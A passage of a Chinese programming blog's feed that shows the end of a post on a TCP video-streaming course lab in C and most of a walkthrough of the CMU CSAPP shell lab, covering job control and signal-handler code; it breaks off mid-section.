class="keyword">while</span> (send_count &lt; file_size)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="comment">/***************************************************************************************************/</span></span><br><span class="line">         <span class="comment">/**************************  任务1： 发送指定视频文件（按照固定大小buffer方式） ********************/</span></span><br><span class="line">         <span class="comment">/***************************************************************************************************/</span></span><br><span class="line">     <span class="type">char</span> buffer[BUFFER_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">       </span><br><span class="line">     <span class="type">int</span> bytes_read = (send_count + BUFFER_SIZE &lt;= file_size) ? BUFFER_SIZE : file_size - send_count;</span><br><span class="line">fread(buffer, bytes_read, <span class="number">1</span>, fp);</span><br><span class="line">     </span><br><span class="line">     bytes_sent = send(new_socket, buffer, bytes_read, <span class="number">0</span>);</span><br><span class="line">     <span class="keyword">if</span> (bytes_sent &lt; <span class="number">0</span>)</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;ERROR in send video\n&quot;</span>);</span><br><span class="line">     </span><br><span class="line">     send_count += bytes_sent;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;video send progress: %d / %d\n&quot;</span>, send_count, file_size);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>2）在客户端：</p><p>接收服务端发送的数据并写入文件。文件末尾无法完整填充缓冲区的处理方式同服务端</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   <span class="type">int</span> recv_count = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">while</span> (recv_count &lt; file_size)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="comment">/************************************************************************/</span></span><br><span class="line">       <span class="comment">/***************** 任务3 ： 如何使用buffer接收视频文件？*****************/</span></span><br><span class="line">       <span class="comment">/************************************************************************/</span></span><br><span class="line">       </span><br><span class="line">       bytes_recv = (recv_count + BUFFER_SIZE &lt;= file_size) ? BUFFER_SIZE : file_size - recv_count;</span><br><span class="line">       bytes_recv = recv(sock, video_segement + recv_count, bytes_recv, <span class="number">0</span>);</span><br><span class="line">       </span><br><span class="line">recv_count += bytes_recv;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s recv progress: %d / %d\n&quot;</span>, req, recv_count, file_size);</span><br><span class="line">   &#125;    </span><br></pre></td></tr></table></figure><h2 id="2-实现流式视频传输"><a href="#2-实现流式视频传输" class="headerlink" title="2. 实现流式视频传输"></a>2. 实现流式视频传输</h2><p>实现流式视频传输要求我们在客户端请求同一个视频的多个视频段，那就利用<strong>sprintf</strong>将指定视频名（包括<strong>视频名称-视频分辨率-视频码率</strong>）与<strong>视频段序号</strong>拼接在一起，在客户端循环请求并接收，在服务端循环发送。最后再在客户端调用player.h中设计好的函数，在网页中播放视频</p><p>在客户端：</p><p>调用<strong>StartStreamingServer()</strong> 初始化播放器等资源，在循环中利用sprintf构造请求的文件名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">StartStreamingServer();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> id = <span class="number">0</span>;id &lt; <span class="number">60</span>; ++id)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送下载请求</span></span><br><span class="line">    <span class="type">int</span> bytes_sent = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> s_stop_byte = <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 视频文件名</span></span><br><span class="line">    <span class="type">char</span> req[REQUEST_SIZE] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">/******************************************************************/</span></span><br><span class="line">    <span class="comment">/***************** 任务2：如何按顺序选择视频文件？*****************/</span></span><br><span class="line">    <span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="built_in">sprintf</span>(req, <span class="string">&quot;ocean-1080p-8000k-%d.ts&quot;</span>, id);</span><br><span class="line"></span><br><span class="line">    bytes_sent = send(sock, req, REQUEST_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (bytes_sent &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR in send\n&quot;</span>);</span><br><span class="line">    bytes_sent = send(sock, &amp;s_stop_byte, <span class="keyword">sizeof</span>(s_stop_byte), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (bytes_sent &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR in send\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;send req: %s\n&quot;</span>, req);</span><br></pre></td></tr></table></figure><p>接收完成时调用ReceiveSegment()将完整的视频段交付给播放器，等待播放<br>在结束阶段调用WaitEnd()等待视频播放完毕后关闭播放器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/***数据接收完成阶段***/</span></span><br><span class="line">ReceiveSegment(video_segement, req, file_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放内存</span></span><br><span class="line">    <span class="built_in">free</span>(video_segement);    </span><br><span class="line">video_segement = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">   <span class="comment">/*************************************************************************************/</span></span><br><span class="line">   <span class="comment">/*********任务2（扩展）：如何在视频流传输完成后，通知server结束视频传输？*************/</span></span><br><span class="line">   <span class="comment">/*************************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***结束阶段***/</span></span><br><span class="line">closesocket(sock);</span><br><span class="line">WSACleanup();</span><br><span class="line"></span><br><span class="line">WaitEnd();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h1><p>先编译运行server.c，服务端启动监听，如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Create Server Socket Success.</span><br><span class="line">Server Bind Port Success.</span><br><span class="line">Server Listening.....</span><br></pre></td></tr></table></figure><p>后编译运行client.c，开始依次传输视频文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ocean-1080p-8000k-59.ts recv progress: 178176 / 181608</span><br><span class="line">ocean-1080p-8000k-59.ts recv progress: 179200 / 181608</span><br><span class="line">ocean-1080p-8000k-59.ts recv progress: 180224 / 181608</span><br><span class="line">ocean-1080p-8000k-59.ts recv progress: 181248 / *181608*</span><br><span class="line">ocean-1080p-8000k-59.ts recv progress: 181608 / 181608</span><br><span class="line">file_path .\download\ocean-1080p-8000k-59.ts</span><br></pre></td></tr></table></figure><p>网页播放视频如下：</p><p><img src="/img/2024/03/streamingplay.png" alt="streamingplay.png"></p><p>帅帅帅</p><p>（其实还有思考题，找时间再研究下</p>]]></content>
      
      
      <categories>
          
          <category> 课程实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CMU 15-213 CSAPP】详解shell lab——编写自己的shell</title>
      <link href="/2024/02/22/%E3%80%90CMU%2015-213%20CSAPP%E3%80%91%E8%AF%A6%E8%A7%A3shell%20lab%E2%80%94%E2%80%94%E7%BC%96%E5%86%99%E8%87%AA%E5%B7%B1%E7%9A%84shell/"/>
      <url>/2024/02/22/%E3%80%90CMU%2015-213%20CSAPP%E3%80%91%E8%AF%A6%E8%A7%A3shell%20lab%E2%80%94%E2%80%94%E7%BC%96%E5%86%99%E8%87%AA%E5%B7%B1%E7%9A%84shell/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>视频已经刷完好几天了，lab才打完这个，不得不说shell lab也是设计的非常贴心，注意事项几乎都能在文档找到。</p><p>参考资料：</p><p>课程视频链接：<a href="https://www.bilibili.com/video/BV1iW411d7hd">2015 CMU 15-213 CSAPP 深入理解计算机系统 课程视频</a></p><p>实验文档：<a href="http://csapp.cs.cmu.edu/3e/shlab.pdf">shlab.dvi (cmu.edu)</a></p><h1 id="一、实验须知"><a href="#一、实验须知" class="headerlink" title="一、实验须知"></a>一、实验须知</h1><p>实验文件已经在main函数中为我们完成了命令行参数的读取、给信号绑定handler等主体部分，并且提供了一系列有用好用的函数，我们需要做的只有在<strong>tsh.c</strong>中完成以下函数：</p><ol><li>eval: 解析每条命令行的类型并执行</li><li>builtin_cmd: 识别和处理四条内置命令: quit, fg, bg 和 jobs.</li><li>do_bgfg: 实现内置命令fg 和 bg</li><li>waitfg: 等待前台作业完成</li><li>sigchld_handler: 接收SIGCHLD信号</li><li>sigint_handler: 接收SIGINT(Ctrl + C)信号</li><li>sigtstp_handler: 接收SIGINT(Ctrl + Z)信号</li></ol><p>实验文件还提供了参考的tshref，sdriver.pl以及许多tracexx.txt文件供我们对比检验自己的tsh是否符合要求，使用方法如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/usr/coding/shlab-handout# ./sdriver.pl -a &quot;-p&quot; -t trace01.txt -s ./tsh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># trace01.txt - Properly terminate on EOF.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">root@Andrew:/usr/coding/shlab-handout<span class="comment"># ./sdriver.pl -a &quot;-p&quot; -t trace01.txt -s ./tshref</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># trace01.txt - Properly terminate on EOF.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">root@Andrew:/usr/coding/shlab-handout<span class="comment">#</span></span></span><br></pre></td></tr></table></figure><br>-a “-p”表示输入不会有多余的prompt，观感更佳<br>-t 指定tracexx.txt，即测试点，共有16个<br>-s 指定shell，一次指定参考文件tshref，一次指定自己的tsh，检查两次的输出是否一致即可</p><h1 id="二、编写代码"><a href="#二、编写代码" class="headerlink" title="二、编写代码"></a>二、编写代码</h1><p>按照把trace01到trace16一个一个攻关的思路，就能一点点把shell造全了。</p><p>由于过程实在有些曲折，而且也有部分失败的代码被抛弃了，就懒得展示每一步的过程了。直接上每个函数的代码然后解说。</p><h2 id="1-eval"><a href="#1-eval" class="headerlink" title="1. eval"></a>1. eval</h2><p>eval的参数<strong>cmdline</strong>是从命令行输入的一串字符，结尾是换行符\n，所以在<strong>输出cmdline是自带换行</strong>的</p><p>实验提供了函数<strong>parseline</strong>，用于解析cmdline中的每个参数，返回一个int值<strong>bg代表后台作业</strong>（结尾是&amp;符号的时候）</p><p>随后利用<strong>builtin_cmd</strong>判断是否为内置指令，是的话在其中执行，返回1；不是的话返回0，之后再fork + execve调用可执行文件。注意到需要对不存在的可执行文件做异常处理，打印Command not found，并且指定子进程的进程组id为自身<strong>setgpid(0, 0)</strong>，从而保证前台进程组只有我们的shell。</p><blockquote><p>After the fork, but before the execve, the child process should call setpgid(0, 0), which puts the child in a new process group whose group ID is identical to the child’s PID. This ensures that there will be only one process, your shell, in the foreground process group</p></blockquote><p>由于我们维护一个<strong>全局的job_t类型数组jobs</strong>，并在每次创建作业后调用<strong>addjob</strong>保存作业的信息到jobs当中。</p><p>但是由于我们将要在<strong>sigchld_handler</strong>中对jobs数组做某些操作，比如使用<strong>deletejob</strong>。为了保证addjob和deletejob的顺序，我们必须阻塞SIGCHLD <strong>从fork进程之前</strong> 到 <strong>完成了addjob之后</strong>，才允许进程接收SIGCHLD</p><p>完整代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span> </span><br><span class="line">&#123;   </span><br><span class="line">    <span class="type">char</span> *argv[MAXARGS];</span><br><span class="line">    <span class="type">int</span> bg = parseline(cmdline, argv);</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">if</span>(!builtin_cmd(argv))&#123;</span><br><span class="line">        <span class="comment">// 阻塞SIGCHLD的接收，保证addjob和deletejob的顺序</span></span><br><span class="line">        <span class="type">sigset_t</span> mask;</span><br><span class="line">        sigemptyset(&amp;mask);</span><br><span class="line">        sigaddset(&amp;mask, SIGCHLD);</span><br><span class="line"></span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((pid = fork()) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// Fork失败</span></span><br><span class="line">            unix_error(<span class="string">&quot;Fork error&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// 子进程，解除SIGCHLD的阻塞，然后execve运行程序</span></span><br><span class="line">            sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">            setpgid(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s:Command not found.\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 主进程</span></span><br><span class="line">            <span class="comment">// 添加job后解除阻塞，保证add和delete的顺序</span></span><br><span class="line">            <span class="comment">// 前台运行时，调用waitfg做自旋(spin)</span></span><br><span class="line">            </span><br><span class="line">            addjob(jobs, pid, bg ? BG : FG, cmdline);</span><br><span class="line">            sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(bg)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                waitfg(pid);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="2-builtin-cmd"><a href="#2-builtin-cmd" class="headerlink" title="2. builtin_cmd"></a>2. builtin_cmd</h2><p>内置指令包括四个：</p><ol><li>quit：遇到quit时，直接终止shell所在进程就行了，简单！</li><li>jobs：也简单！实验已经给我们写好了listjobs，直接调就好了</li><li>bg和fg：识别出来后就丢进do_bgfg里边，另外再处理</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span> </span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>))&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>))&#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>))&#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-sigint-handler-和-sigtstp-handler"><a href="#3-sigint-handler-和-sigtstp-handler" class="headerlink" title="3. sigint_handler 和 sigtstp_handler"></a>3. sigint_handler 和 sigtstp_handler</h2><p>通过函数<strong>fgpid</strong>拿到前台作业的pid，然后将信号发送给<strong>进程组中每个进程</strong></p><blockquote><p>int kill(pid_t pid, int sig)<br>如果 pid 大于零，那么 kill 函数发送信号号码 sig 给进程 pid。如果 pid 小于零，那么 kill 发送信号sig给进程组 abs(pid)中的每个进程。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;   </span><br><span class="line">    <span class="type">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="comment">// printf(&quot;Job [%d] (%d) terminated by signal 2\n&quot;, pid2jid(pid), pid);</span></span><br><span class="line">    kill(-pid, SIGINT);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;   </span><br><span class="line">    <span class="type">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="comment">// printf(&quot;Job [%d] (%d) stopped by signal 20\n&quot;, pid2jid(pid), pid);</span></span><br><span class="line">    kill(-pid, SIGTSTP);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里不打印前台作业被终止或停止的信息，是因为进程被终止或停止时会发送SIGCHLD信号，我们可以在sigchld_handler中处理。</p><p>而非要在sigchld_handler处理的原因是：sigchld_handler不仅能够监控<strong>前台作业</strong>，还能够监控<strong>后台作业</strong>的终止和停止（为了通过<strong>trace16</strong>），并且能够利用status获得终止或停止的原因</p><h2 id="4-do-bgfg"><a href="#4-do-bgfg" class="headerlink" title="4. do_bgfg"></a>4. do_bgfg</h2><p>bg 和 fg的处理思路高度相似，先解析参数有没有%，然后决定是使用<strong>getjobjid</strong>还是<strong>getjobpid</strong>确认作业是否存在，然后做一系列<strong>error handling（trace13要求）</strong></p><p>最后，向<strong>作业的pid所标识进程组</strong>发送信号<strong>SIGCONT</strong>，如果是bg就打印后台作业的信息，如果是fg就调用waitfg自旋</p><p>完整代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span> </span><br><span class="line">&#123;   </span><br><span class="line">    <span class="comment">// parse argument </span></span><br><span class="line">    <span class="type">int</span> jid = <span class="number">0</span>;</span><br><span class="line">    <span class="type">pid_t</span> pid = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> bg = !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">        jid = atoi(argv[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(jid)&#123;</span><br><span class="line">        job = getjobjid(jobs, jid);</span><br><span class="line">        <span class="keyword">if</span>(job == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, jid);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        pid = job-&gt;pid;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">        job = getjobpid(jobs, pid);</span><br><span class="line">        <span class="keyword">if</span>(job == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, pid);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kill(-pid, SIGCONT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(bg)&#123;</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        waitfg(pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="5-waitfg"><a href="#5-waitfg" class="headerlink" title="5. waitfg"></a>5. waitfg</h2><p>前面说了几次调用waitfg自旋（在eval和do_bgfg中），为啥要自旋而不是waitpid呢？</p><p>因为如果我们在waitfg中调用waitpid回收前台作业的话，当该作业终止或停止，它会发送信号SIGCHLD，这就造成了sigchld_handler和waitfg的竞争关系，那就不如让sigchld_handler回收就好了。</p><p>而且文档中也明确建议了waitfg中仅使用一个循环+sleep：</p><blockquote><p>One of the tricky parts of the assignment is deciding on the allocation of work between the <em>waitfg</em> and <em>sigchld_handler</em> functions. We recommend the following approach:</p><p>– In <em>waitfg</em>, use a busy loop around the <em>sleep</em> function.</p><p>– In <em>sigchld_handler</em>, use exactly one call to <em>waitpid</em>.</p><p>While other solutions are possible, such as calling waitpid in both <em>waitfg</em> and <em>sigchld_handler</em>, these can be very confusing. It is simpler to do all reaping in the handler.</p></blockquote><p>代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">while</span>(fgpid(jobs) == pid)&#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="6-sigchld-handler"><a href="#6-sigchld-handler" class="headerlink" title="6. sigchld_handler"></a>6. sigchld_handler</h2><p>最重量级的来了，前面提到：当子进程<strong>终止或停止</strong>时，都会给父进程发送一个SIGHCLD信号，告诉父进程该调用<strong>waitpid</strong>去回收它了</p><p>当然，waitpid也有很多花活：</p><blockquote><p>pid_t waitpid(pidt pid,int *status, int options);</p><p>如果 pid&gt;0，那么等待集合就是一个单独的子进程，它的进程ID等于 pid。<br>如果 pid=-1，那么等待集合就是由父进程所有的子进程组成的。</p></blockquote><p>所以我们这里应该使用<strong>pid = -1</strong>等待任一子进程</p><blockquote><p>可以通过用常量 WNOHANG 和WUNTRACED的不同组合来设置 options，修改默认行为:<br><strong>WNOHANG</strong>: 如果没有等待集合中的任何子进程终止，那么就立即返回(返回值为0)。<br><strong>WUNTRACED</strong>: 挂起调用进程的执行，直到等待集合中的一个进程变成终止的或者被暂停。返回的 PID为导致返回的终止或暂停子进程的PID。<br><strong>WNOHANG | WUNTRACED</strong>: 立即返回，如果没有等待集合中的任何子进程停止或终止，那么返回值为0，或者返回值等于那个被停止或者终止子进程的PD。</p></blockquote><p>我们需要sigchld_handler在后台静静地处理终止和停止的子进程，而不会影响主进程的执行，所以options应该选择<strong>WNOHANG | WUNTRACED</strong></p><p>然后就是根据几个解释status的宏，处理每种发送SIGCHLD的情况</p><blockquote><p><strong>WIFEXITED(status)</strong>: 如果子进程正常终止就返回真，也就是通过调用exit 或者一个返回(return)<br><strong>WIFSIGNALED(status)</strong>: 